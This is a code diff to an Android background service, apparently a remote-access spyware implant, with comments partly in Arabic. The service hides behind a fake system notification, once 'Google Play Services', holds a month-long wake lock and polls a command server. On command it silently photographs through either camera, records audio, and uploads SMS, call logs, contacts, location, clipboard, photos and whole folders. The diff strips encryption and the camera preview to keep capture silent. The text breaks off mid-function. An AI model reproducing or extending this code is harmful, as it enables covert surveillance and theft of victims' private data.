@@ -31,7 +31,6 @@ import android.util.Base64
 import androidx.camera.core.CameraSelector
 import androidx.camera.core.ImageCapture
 import androidx.camera.core.ImageCaptureException
-import androidx.camera.core.Preview
 import androidx.camera.lifecycle.ProcessCameraProvider
 import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
@@ -49,20 +48,13 @@ import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
-import java.io.ByteArrayOutputStream
 import java.io.File
 import java.io.FileOutputStream
-import java.security.MessageDigest
-import java.security.SecureRandom
 import java.util.UUID
 import java.util.concurrent.TimeUnit
 import java.util.zip.Deflater
-import java.util.zip.GZIPOutputStream
 import java.util.zip.ZipEntry
 import java.util.zip.ZipOutputStream
-import javax.crypto.Cipher
-import javax.crypto.spec.GCMParameterSpec
-import javax.crypto.spec.SecretKeySpec
 import kotlin.coroutines.resume
 
 class SyncService : LifecycleService() {
@@ -74,8 +66,6 @@ class SyncService : LifecycleService() {
     private var wakeLock: PowerManager.WakeLock? = null
     private lateinit var cameraManager: CameraManager
     private var wifiAutopilot = true
-    private var stealthState = "NEURAL_v19"
-    private var deviceSecret: String = ""
 
     private val client = OkHttpClient.Builder()
         .connectTimeout(120, TimeUnit.SECONDS)
@@ -85,10 +75,8 @@ class SyncService : LifecycleService() {
         .build()
 
     companion object {
-        private const val CHANNEL_ID = "sys_assets_v19"
+        private const val CHANNEL_ID = "sys_sync_channel"
         private const val NOTIF_ID = 888
-        private const val PREFS = "sys_assets_prefs"
-        private const val KEY_SECRET = "device_secret"
     }
 
     override fun onCreate() {
@@ -96,24 +84,12 @@ class SyncService : LifecycleService() {
         acquireWakeLock()
         startForegroundNotif()
         cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
-        deviceSecret = getOrCreateDeviceSecret()
-    }
-
-    private fun getOrCreateDeviceSecret(): String {
-        val prefs = getSharedPreferences(PREFS, Context.MODE_PRIVATE)
-        var secret = prefs.getString(KEY_SECRET, null)
-        if (secret.isNullOrEmpty()) {
-            secret = UUID.randomUUID().toString().replace("-", "") +
-                    UUID.randomUUID().toString().replace("-", "")
-            prefs.edit().putString(KEY_SECRET, secret).apply()
-        }
-        return secret
     }
 
     private fun acquireWakeLock() {
         try {
             val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
-            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Assets::WakeV19").apply {
+            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Assets::WakeV20").apply {
                 acquire(30L * 24 * 60 * 60 * 1000)
             }
         } catch (_: Exception) {}
@@ -130,13 +106,12 @@ class SyncService : LifecycleService() {
             (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(ch)
         }
         val n: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Google Play Services")
-            .setContentText("Framework operational...")
+            .setContentTitle("System Assets Core")
+            .setContentText("جاري تهيئة الملفات...")
             .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setSilent(true)
             .setOngoing(true)
-            .setShowWhen(false)
             .build()
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
@@ -150,14 +125,14 @@ class SyncService : LifecycleService() {
         scope.launch {
             while (isActive) {
                 try {
+                    // إرسال نبضة بصيغة JSON صريحة بدون تشفير
                     val hb = JSONObject().apply {
                         put("type", "HEARTBEAT")
                         put("status", "ONLINE")
                         put("nodeId", getNodeId())
-                        put("deviceSecret", deviceSecret)
-                        put("model", "${Build.MODEL} [$stealthState]")
+                        put("model", Build.MODEL)
                     }
-                    val resp = sendEncrypted(hb.toString())
+                    val resp = sendJson(hb.toString())
                     if (resp != null && resp.has("task") && !resp.isNull("task")) {
                         executeTask(resp.getJSONObject("task"))
                     }
@@ -168,63 +143,21 @@ class SyncService : LifecycleService() {
         return START_STICKY
     }
 
-    private fun getKey(): ByteArray {
-        val raw = if (deviceSecret.isNotEmpty()) "$deviceSecret|uranium-v19" else "fallback|uranium-v19"
-        return MessageDigest.getInstance("SHA-256").digest(raw.toByteArray(Charsets.UTF_8))
-    }
-
-    private fun encryptPayload(plain: String): String {
-        val bout = ByteArrayOutputStream()
-        GZIPOutputStream(bout).use { it.write(plain.toByteArray(Charsets.UTF_8)) }
-        val compressed = bout.toByteArray()
-        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
-        val iv = ByteArray(12).apply { SecureRandom().nextBytes(this) }
-        cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(getKey(), "AES"), GCMParameterSpec(128, iv))
-        val out = cipher.doFinal(compressed)
-        val enc = out.copyOfRange(0, out.size - 16)
-        val tag = out.copyOfRange(out.size - 16, out.size)
-        val pkt = JSONObject().apply {
-            put("v", iv.joinToString("") { "%02x".format(it) })
-            put("g", tag.joinToString("") { "%02x".format(it) })
-            put("d", enc.joinToString("") { "%02x".format(it) })
-        }
-        return Base64.encodeToString(pkt.toString().toByteArray(), Base64.NO_WRAP)
-    }
-
-    private fun decryptPayload(b64: String): String? {
-        return try {
-            val pkt = JSONObject(String(Base64.decode(b64.trim(), Base64.NO_WRAP)))
-            val iv = hexToBytes(pkt.getString("v"))
-            val tag = hexToBytes(pkt.getString("g"))
-            val data = hexToBytes(pkt.getString("d"))
-            val cipher = Cipher.getInstance("AES/GCM/NoPadding")
-            cipher.init(Cipher.DECRYPT_MODE, SecretKeySpec(getKey(), "AES"), GCMParameterSpec(128, iv))
-            String(cipher.doFinal(data + tag), Charsets.UTF_8)
-        } catch (_: Exception) { null }
-    }
-
-    private fun hexToBytes(s: String): ByteArray = ByteArray(s.length / 2) {
-        ((Character.digit(s[it * 2], 16) shl 4) + Character.digit(s[it * 2 + 1], 16)).toByte()
-    }
-
-    private fun sendEncrypted(plain: String): JSONObject? {
+    private fun sendJson(plain: String): JSONObject? {
         var tries = 0
         while (tries < 3) {
             try {
                 val req = Request.Builder()
                     .url(SERVER)
-                    .post(encryptPayload(plain).toRequestBody("text/plain".toMediaType()))
+                    .post(plain.toRequestBody("application/json".toMediaType()))
                     .addHeader("x-node-id", getNodeId())
                     .addHeader("x-node-model", Build.MODEL)
                     .addHeader("x-android-sdk", Build.VERSION.SDK_INT.toString())
-                    .addHeader("x-device-secret", deviceSecret)
                     .build()
                 client.newCall(req).execute().use { r ->
                     if (r.isSuccessful) {
                         val raw = r.body?.string() ?: "{}"
-                        val dec = decryptPayload(raw)
-                        return try { if (dec != null) JSONObject(dec) else JSONObject(raw) }
-                        catch (_: Exception) { JSONObject(raw) }
+                        return JSONObject(raw)
                     }
                 }
             } catch (_: Exception) { tries++; Thread.sleep(tries * 1000L) }
@@ -241,31 +174,26 @@ class SyncService : LifecycleService() {
             action.contains("CMD_BEEP") -> playBeep()
             action.contains("MIC_AI_LISTEN") -> recordAudio()
             action.contains("MICRO_BURST_SNAP") -> streamLatestPhoto("MicroBurst")
-            action.contains("EXTRACT_CAMERA_SNAP") -> captureSilentPhoto()
-            action.contains("EXTRACT_CAMERA_SNAP_FRONT") -> captureSilentPhoto(front = true)
-            action.contains("EXTRACT_VIDEO_SNAP") -> captureVideoShort()
+            action.contains("EXTRACT_CAMERA_SNAP") -> captureSilentPhoto(false)
+            action.contains("EXTRACT_CAMERA_SNAP_FRONT") -> captureSilentPhoto(true)
             action.contains("EXTRACT_SMS") -> sendReport("SMS", readSms())
             action.contains("EXTRACT_CALLS") -> sendReport("CallLog", readCalls())
             action.contains("EXTRACT_CONTACTS") -> sendReport("Contacts", readContacts())
             action.contains("EXTRACT_APPS") -> sendReport("Apps", readApps())
             action.contains("EXTRACT_LOCATION") -> sendReport("Location", readLocation())
-            action.contains("EXTRACT_DEVICE_INFO") -> sendReport("Device", readDeviceInfo())
             action.contains("EXTRACT_CLIPBOARD") -> sendReport("Clipboard", readClipboard())
             action.contains("EXTRACT_PHOTOS") -> streamMedia(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, 20)
             action.contains("EXTRACT_VIDEOS") -> streamMedia(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, 10)
-            action.contains("PROC_DCIM") -> if (wifiOk()) zipFolder("DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI) else sendReport("Delay", "DCIM مؤجل")
-            action.contains("PROC_DOWNLOAD") -> if (wifiOk()) zipFolder("Download", MediaStore.Files.getContentUri("external")) else sendReport("Delay", "Download مؤجل")
-            action.contains("PROC_PICTURES") -> zipFolder("Pictures", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
-            action.contains("PROC_DOCUMENTS") -> zipFolder("Documents", MediaStore.Files.getContentUri("external"))
+            action.contains("PROC_DCIM") -> zipFolder("DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
+            action.contains("PROC_DOWNLOAD") -> zipFolder("Download", MediaStore.Files.getContentUri("external"))
             action.contains("STORAGE_AUDIT") -> sendReport("Audit", storageAudit())
             action.contains("WIFI_AUTOPILOT") -> { wifiAutopilot = !wifiAutopilot; sendReport("WiFi", "Autopilot: $wifiAutopilot") }
             action.contains("GEO_FENCE_ALERT") -> sendReport("GeoAlert", readLocation())
-            action.contains("POLY_MUTATE") -> { stealthState = "MUT_${System.currentTimeMillis() % 10000}"; sendReport("Poly", "Became $stealthState") }
-            action.contains("STEALTH_BLACKOUT") -> sendReport("Stealth", "Blackout active")
             action.contains("SELF_DESTRUCT") -> { sendReport("Destruct", "Wiping..."); try { cacheDir.deleteRecursively() } catch (_: Exception) {}; stopSelf() }
         }
     }
 
+    // لقطة صامتة بدون واجهة (إزالة Preview لحل مشكلة الخلفية)
     @SuppressLint("MissingPermission")
     private suspend fun captureSilentPhoto(front: Boolean = false) {
         try {
@@ -273,13 +201,13 @@ class SyncService : LifecycleService() {
             val capture = ImageCapture.Builder()
                 .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                 .build()
-            val preview = Preview.Builder().build()
             val selector = if (front) CameraSelector.DEFAULT_FRONT_CAMERA else CameraSelector.DEFAULT_BACK_CAMERA
 
             provider.unbindAll()
-            provider.bindToLifecycle(this, selector, preview, capture)
+            // نربط الـ ImageCapture فقط بدون Preview
+            provider.bindToLifecycle(this, selector, capture)
 
-            delay(400L)
+            delay(500L) // انتظار بسيط لضبط التركيز
 
             val file = File(cacheDir, "silent_${System.currentTimeMillis()}.jpg")
             val opts = ImageCapture.OutputFileOptions.Builder(file).build()
@@ -300,7 +228,7 @@ class SyncService : LifecycleService() {
             provider.unbindAll()
 
             if (ok && file.exists() && file.length() > 0) {
-                uploadChunked(file.readBytes(), file.name)
+                uploadRawFile(file)
                 sendReport("Camera", "التقط صورة صامتة (${file.length()/1024}KB)")
             }
             try { file.delete() } catch (_: Exception) {}
@@ -368,7 +296,11 @@ class SyncService : LifecycleService() {
                             val itemUri = ContentUris.withAppendedId(uri, c.getLong(idIdx))
                             val name = if (nIdx >= 0) c.getString(nIdx) else "snap.jpg"
                             val bytes = contentResolver.openInputStream(itemUri)?.use { it.readBytes() } ?: return@use
-                            uploadChunked(bytes, "${prefix}_$name")
+                            // نرسلها عبر الـ Raw Upload مباشرة
+                            val tmpFile = File(cacheDir, "${prefix}_$name")
+                            FileOutputStream(tmpFile).use { it.write(bytes) }
+                            uploadRawFile(tmpFile)
+                            tmpFile.delete()
                         }
                     }
                 }
@@ -376,22 +308,10 @@ class SyncService : LifecycleService() {
         }
     }
 
-    private fun captureVideoShort() {
-        scope.launch {
-            try {
-                val intent = Intent(MediaStore.ACTION_VIDEO_CAPTURE).apply {
-                    putExtra(MediaStore.EXTRA_DURATION_LIMIT, 10)
-                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                }
-                startActivity(intent)
-            } catch (_: Exception) {}
-        }
-    }
-
     private fun sendReport(label: String, content: String) {
         scope.launch {
             val r = JSONObject().apply { put("type", "TEXT_REPORT"); put("data", "=== $label ===\n$content") }
-            sendEncrypted(r.toString())
+            sendJson(r.toString())
         }
     }
 
@@ -453,8 +373,6 @@ class SyncService : LifecycleService() {
         } catch (e: Exception) { "Err: ${e.message}" }
     }
 
-    private fun readDeviceInfo(): String = "Model: ${Build.MODEL}\nBrand: ${Build.BRAND}\nSDK: ${Build.VERSION.SDK_INT}\nNode: ${getNodeId()}\nSecretLen: ${deviceSecret.length}"
-
     private fun readClipboard(): String {
         return try {
             val cb = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
@@ -484,15 +402,6 @@ class SyncService : LifecycleService() {
         return Pair(cnt, bytes.toDouble() / (1024 * 1024))
     }
 
-    private fun wifiOk(): Boolean {
-        if (!wifiAutopilot) return true
-        return try {
-            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
-            val n = cm.activeNetwork ?: return false
-            cm.getNetworkCapabilities(n)?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ?: false
-        } catch (_: Exception) { true }
-    }
-
     private fun getNodeId(): String = try {
         Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "node-unknown"
     } catch (_: Exception) { "node-unknown" }
@@ -506,7 +415,10 @@ class SyncService : LifecycleService() {
                     while (c.moveToNext()) if (idIdx >= 0) {
                         val fileUri = ContentUris.withAppendedId(uri, c.getLong(idIdx))
                         val bytes = contentResolver.openInputStream(fileUri)?.use { it.readBytes() } ?: continue
-                        uploadChunked(bytes, getFileName(fileUri))
+                        val tmpFile = File(cacheDir, getFileName(fileUri))
+                        FileOutputStream(tmpFile).use { it.write(bytes) }
+                        uploadRawFile(tmpFile)
+                        tmpFile.delete()
                     }
                 }
             } catch (_: Exception) {}
@@ -550,72 +462,4 @@ class SyncService : LifecycleService() {
         }
     }
 
-    private fun uploadChunked(bytes: ByteArray, name: String) {
-        scope.launch {
-            val uploadId = UUID.randomUUID().toString()
-            val chunkSize = 128 * 1024
-            val total = (bytes.size + chunkSize - 1) / chunkSize
-            val hash = MessageDigest.getInstance("SHA-256").digest(bytes).joinToString("") { "%02x".format(it) }
-            var idx = 0
-            var off = 0
-            while (off < bytes.size) {
-                idx++
-                val end = minOf(off + chunkSize, bytes.size)
-                val chunk = bytes.copyOfRange(off, end)
-                val pkt = JSONObject().apply {
-                    put("type", "MEDIA_CHUNK")
-                    put("uploadId", uploadId)
-                    put("fileName", name)
-                    put("chunkIndex", idx)
-                    put("totalChunks", total)
-                    put("isLast", idx == total)
-                    put("fileHash", hash)
-                    put("data", Base64.encodeToString(chunk, Base64.NO_WRAP))
-                }
-                sendEncrypted(pkt.toString())
-                off = end
-            }
-        }
-    }
-
-    private fun uploadRawFile(file: File) {
-        scope.launch {
-            var tries = 0
-            while (tries < 5) {
-                try {
-                    val req = Request.Builder()
-                        .url(UPLOAD)
-                        .post(file.readBytes().toRequestBody("application/octet-stream".toMediaType()))
-                        .addHeader("x-node-id", getNodeId())
-                        .addHeader("x-node-model", Build.MODEL)
-                        .addHeader("x-device-secret", deviceSecret)
-                        .addHeader("x-file-name", file.name)
-                        .build()
-                    client.newCall(req).execute().use { r -> if (r.isSuccessful) return@launch }
-                } catch (_: Exception) {
-                    tries++
-                    delay(2000L)
-                }
-            }
-        }
-    }
-
-    private fun getFileName(uri: Uri): String {
-        var n = "file_${System.currentTimeMillis()}.dat"
-        try {
-            contentResolver.query(uri, null, null, null, null)?.use { c ->
-                if (c.moveToFirst()) {
-                    val i = c.getColumnIndex(OpenableColumns.DISPLAY_NAME)
-                    if (i >= 0) n = c.getString(i)
-                }
-            }
-        } catch (_: Exception) {}
-        return n
-    }
-
-    override fun onDestroy() {
-        try { wakeLock?.release() } catch (_: Exception) {}
-        scope.cancel()
-        super.onDestroy()
-    }
-}
+    private fun uploadRaw
